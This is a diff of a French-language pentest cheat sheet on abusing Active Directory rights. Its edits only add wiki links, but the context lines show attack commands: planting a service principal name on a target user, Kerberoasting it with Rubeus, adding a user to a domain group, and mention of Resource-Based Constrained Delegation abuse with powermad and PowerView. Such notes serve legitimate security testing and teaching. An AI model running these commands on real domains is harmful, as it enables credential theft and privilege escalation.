@@ -16,7 +16,7 @@ Set-DomainObject -Identity UtilisateurCible -Set @{serviceprincipalname='us/hack
 Set-ADUser -Identity UtilisateurCible -ServicePrincipalNames @{add='us/hackedBro'}
 ```
 
-Kerberoasting de l'utilisateur :
+[Kerberoasting](../Kerberoasting.md) de l'utilisateur :
 
 ```powershell
 Rubeus.exe kerberoast /outfile:target.txt
@@ -50,7 +50,7 @@ net group "groupe" user /add /domain
 Ce droit permet d'abuser de la Resource-Based Constrained Delegation (RBCD).
 #### 🍔 Depuis Windows
 
-Pour exploiter ce droit, nous avons besoin des scripts `powermad.ps1` et `powerview`.
+Pour exploiter ce droit, nous avons besoin des scripts `powermad.ps1` et `[PowerView](../../../Cheatsheets/Tools/PowerView.md)`.
 
 Création d'un compte machine :
 
